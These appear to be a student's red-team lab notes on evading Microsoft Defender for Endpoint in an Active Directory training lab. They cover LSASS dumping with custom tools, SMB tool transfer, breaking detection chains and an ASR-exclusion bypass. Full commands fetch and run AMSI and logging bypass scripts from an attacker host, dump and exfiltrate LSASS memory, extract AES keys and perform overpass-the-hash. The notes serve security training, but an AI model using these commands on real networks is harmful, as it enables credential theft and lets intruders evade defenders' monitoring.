#### EDR - Endpoint Detection & Response

- Endpoint Detection and Response (EDRs) system protects individual devices (endpoints) by continuously monitoring for and responding to security threats.
- It includes features for threat detection, incident response, investigation, and forensics, making it a vital component of modern cyber security strategies.
- Most EDRs correlate activity to gain broader telemetry and improve on detection. Even if all performed activity is undetected by an AV, EDRs can still correlate all actions performed to identify attacker TTPs.
- In the past 6-7 years, EDRs have grown exponentially.
- For the red teamers who got started in this era, OPSEC mainly refers to bypassing EDR.
	- This is because, up to 8-9 years ago it was possible that one would get a new tool and keep using it without worrying about detection evasion for a couple of years, but EDRs now are a lot more aggressive.
	- EDRs are a lot more powerful than AVs, because of more telemetry, machine learning and AI implementations.

#### MDE - Microsoft Defender for Endpoints
- In the lab, we target Microsoft's EDR, MDE, which is Microsoft Defender for Endpoint.
- In addition to standard EDR capabilities, MDE has an unfair advantage since it is a Windows native tool, MDE collects and processes behavioural signals from the OS and analyses this using cloud security analytics.
- MDE is also able to utilise Microsoft's telemetry data to facilitate detection.
- MDE also supports detection based on the following technologies:
	- Attack Surface Reduction rules, Exploit protection, Network protection, Controlled Folder Access, and Device control.
- MDE in the lab:
	- MDE is enabled on `eu-sql` in the lab.
	- Visit the MDE dashboard https://security.microsoft.com and login with your student credentials to view and correlate performed activity in the Incidents and Alerts tab.
	- Student credentials are available in the lab portal - https://adlab.enterprisesecurity.io/

#### Evading MDE - Objectives
- Our objective is to remain undetected by AV and EDR on `eu-sql` to perform:
	- SQL Command Execution through SQL Server Links
	- Tool transfer
	- Credential Extraction
	- Data Ex-filtration
	- Lateral Movement/Remote Access

#### Evading MDE - Credential Extraction - LSASS Dump
- While performing LSASS credential dumping, direct interaction/extraction of data from the LSASS process (Ex: `Mimikatz sekurlsa::logonpasswords`) is detected by MDE.
- A more OPSEC friendly way is by performing a dump of LSASS process in a covert way and then ex-filtrating it to later analyse offline.
- However, standard techniques to create LSASS dumps, (Ex: taskmanager -> create dump file) are detected and blocked.
- Most tools create an LSASS dump by:
	- Gaining a handle to the LSASS process.
	- Creating a `minidump` using the `MiniDumpWriteDump` WinAPI function implemented in `dbghelp.dll` / `dbgcore.dll`.
	- Write the dump file on disk.
- These three processes are heavily monitored by EDRs and are usually detected and blocked.
- To circumvent these detections, we can avoid using tools that implement the `MiniDumpWriteDump` function and perform LSASS dump in a different way.
- LSASS Dumping using custom APIs:
	- `MiniDumpDotNet`:
		- [MiniDumpDotNet](https://www.github.com/WhiteOakSecurity/MiniDumpDotNet) is a tool that implements a custom rewritten re-implementation of the `MiniDumpWriteDump` Windows API function.
		- In this tool, the `MiniDumpWriteDump` function is reversed, and a custom implementation is implemented based on a Beacon Object File (BOF) adaption and ReactOS source code.
		- References:
			- MiniDumpDotNet Blog - Part 1: https://blog.cyberadvisors.com/technical-blog/blog/minidumpdotnet-part-1
			- MiniDumpDotNet Blog - Part 2: https://blog.cyberadvisors.com/technical-blog/blog/minidumpdotnet-part-2
			- NanoDump Github: https://github.com/fortra/nanodump
			- PostDump Github: https://github.com/YOLOP0wn/POSTDump
			- Custom MiniDumpWriteDump BOF Github: https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump
			- Source code for MiniDumpWriteDump implementation: https://doxygen.reactos.org/d8/d5d/minidump_8c_source.html
			- Windows API function: https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
		- What `MiniDumpDotNet` needs to dump LSASS is the LSASS Process ID, in some cases, for example, when where we are accessing a target machine using a reverse shell, MDE is aggressive enough to alert in case we try to list the PID of LSASS.
		- If we run the tool from an RDP session right away, MDE is fine with it, but how do we get the LSASS PID to provide to the tool?
		- Finding LSASS PID:
			- Using commands like `tasklist /v` to enumerate LSASS PID is detected by MDE.
			- To avoid this, we can make use of standard WINAPIs to find the LSASS PID which are OPSEC safe.
			- In case of RDP access to the target machine, tools like Task Manager (or other less suspicious alternatives) can also be used for finding the LSASS PID.
			- Here is a code snippet of a custom function called `FindPID` in C++ to dynamically enumerate the LSASS PID:
				- ![[![[Pasted image 20250823114554.png]]Pasted image 20250823114554.png]]
				- If the `FindPID` function shown above is added to the `MiniDumpDotNet` tool, there is  a detection by MDE.
				- Using the `FindPID` code in a standalone executable is not detected by Defender AV or MDE, let's call it `FindLSASSPID.exe`
					- `C:\AD\Tools\DefenderCheck\DefenderCheck.exe C:\AD\Tools\FindLSASSPID.exe`
						- DefenderCheck should not return a detection for the standalone executable.

#### Evading MDE - Tools Transfer & Execution
- We now need to transfer the `FindLSASSPID.exe`, and the `MiniDumpDotNet` binaries to the target machine, `eu-sql`.
	- Downloading tools over HTTP(S) can be risky as it does increase the risk score and chances of detection by the EDR.
	- PowerShell download execute cradles, or tools that are listed in the LOLBAS repository may be very easy to flag for EDRs.
		- Why?
			- Because if there is a process or tool that is not supposed to download anything, for example, if `notepad.exe` is downloading something from the internet, it is risky, and is something that every EDR would detect.
	- However, if binaries that are intended for downloads (for example Edge, `msedge.exe`) are available on the target, we can perform HTTP(S) downloads on the target system without any detections.
	- If we are talking about an internal environment, which means an environment where we have network access to the target machine, then SMB is the best way to transfer and execute tools:
		- Another OPSEC friendly way would be to share files over SMB. Execution can directly be performed from a readable share, and the file dump can directly be written back to the share, this is less risky than standard download and execute actions.

#### Evading MDE - Breaking Detection Chains
- Most EDRs correlate activity in a specific time interval after which it resets, this varies for each EDR.
- To bypass correlation based detection:
	- We can attempt to wait for a small time interval (~10 mins) before performing the next query.
	- Append non-suspicious queries in between subsequent suspicious ones to break the detection chains.
- We will run simple SQL queries on the `eu-sql` server.

#### Evading MDE - Lateral Movement - ASR Rules
- MDE correlates detections heavily around Attack Surface Reduction (ASR) rules.
- ASR rules are configurations that can be applied and customised to reduce the attack surface of a machine. These rules can be customised and referenced with their unique `GUIDs`.
- ASR rules are written in `.lua` and can be reversed and extracted from a specific target Windows machine.
	- We do not need to reverse the rules, we can check out https://github.com/HackingLZ/ExtractedDefender/blob/main/asr/d1e49aac-8f56-4280-b9ba-993a6d77406c.
	- When we check the reversed ASR rules, we are able to observe that there are some exceptions.
		- ASR rules are easy to understand, for example the `GetMonitoredLocations` function displays processes that are monitored and remote execution using them will result in a detection.
		- OS trusted methods like WMI and PSRemoting or administrative tools like PSExec are detected by MDE.
		- To avoid detection based on on a specific ASR rule such as the "Block process creations originating from PSExec and WMI commands" rule:
			- We can use alternatives such as winrm access (winrs) instead of PSExec/WMI execution (This is undetected by MDE but detected by MDI)
			- Use the `GetCommandLineExclusions` function which displays a list of command line exclusions (Ex: `.:\\windows\\ccm\\systemtemp\\.+` ), if included in the command line will result in bypassing this rule and detection.
				- `C:\AD\Tools\WSManWinRM.exe eu-sql.eu.eurocorp.local "cmd /c notepad.exe C:\Windows\ccm\systemtemp\"`
					- `WSManWinRM` is simply an implementation of WinRM.
					- Simply adding the `C:\Windows\ccm\systemtemp\` path to our command would evade detection in this case.

#### Evading MDE - Lateral Movement - Process Detection
- Once we have remote access to a machine, we can use commands like `whoami.exe` for initial enumeration, but we should avoid that for OPSEC reasons.
- Since `whoami.exe` is unlikely to be used under a process like `sqlserver.exe`, a detection is likely to happen.
	- ![[Pasted image 20250823231043.png]]
- A more OPSEC friendly way is by using alternatives like `set username` which perform the same functionality as `whoami.exe` to enumerate the current username, but by using environment variables instead.

#### Learning Objective 23
- Compromise `eu-sqlX` again. Use OPSEC friendly techniques to bypass MDI and MDE wherever possible.
	- First of all we need to create a SMB share, `studentshare1`, and share it with everyone by:
		- Enabling guest access
		- And providing read and write access to everyone
	- In the share, we will store the following files:
		- `FindLSASSPID.exe`
		- `minidumpdotnet`
	- First, we are going to run `FindLSASSPID.exe` on `eu-sql1` using the command execution we have via DB Links.
		- Script Block Logging Bypass, AMSI Bypass:
			- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt)"' -QueryTarget eu-sql1`
		- Executing the `FindLSASSPID.exe` binary in memory: 
			- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-student1.dollarcorp.moneycorp.local\studentshare1\FindLSASSPID.exe''' -QueryTarget eu-sql1`
				- The LSASS PID will be returned in the `CustomQuery` field under `EU-SQL1`.
	- To break the detection chain, we will run a simple SQL command next:
		- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version' -QueryTarget eu-sql1`
	- Next, now that we have the LSASS PID, we will try to dump the memory of the LSASS process using `minidumpdotnet`:
		- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-student1.dollarcorp.moneycorp.local\studentshare1\minidumpdotnet.exe <LSASS PID> \\dcorp-student1.dollarcorp.moneycorp.local\studentshare1\monkey1.dmp''' -QueryTarget eu-sql1`
			- In the command above, we are running `minidumpdotnet.exe` from the file share on the student VM, pass the LSASS PID as a parameter, and write the output back to the file share on the student VM.
			- It should take 5-6 minutes for the entire dump to copy over, the file may show up even before the dump is completely copied.
	- Let's take a look at how the dump looks like once the ex-filtration is completed:
		- Open up `cmd.exe` as an Administrator:
			- `C:\AD\Tools\safetykatz.exe "sekurlsa::minidump C:\AD\Tools\studentshare1\monkey1.dmp" "sekurlsa::evasive-keys" "exit"`
				- The `sekurlsa::minidump` module is used to load the LSASS memory dump, and `sekurlsa::evasive-keys` is used to extract credentials from it.
			- We find the AES keys for a user called `dbadmin`.
	- We can now perform a OverPassTheHash attack using Rubeus, and start a new cmd process as the `dbadmin` user.
		- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:dbadmin /aes256:<AES256 Key of the dbadmin user> /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
	- Please note that PSRemoting, WMI, even winrs is something that MDI may have a problem with.
		- winrs is the safest bet from among these, MDE doesn't care about winrs, but MDI may have a problem with it.
		- We may find a very limited amount of success rate with `WSManWinRM`.
		- If we do not care about evading MDI, we can always use winrs.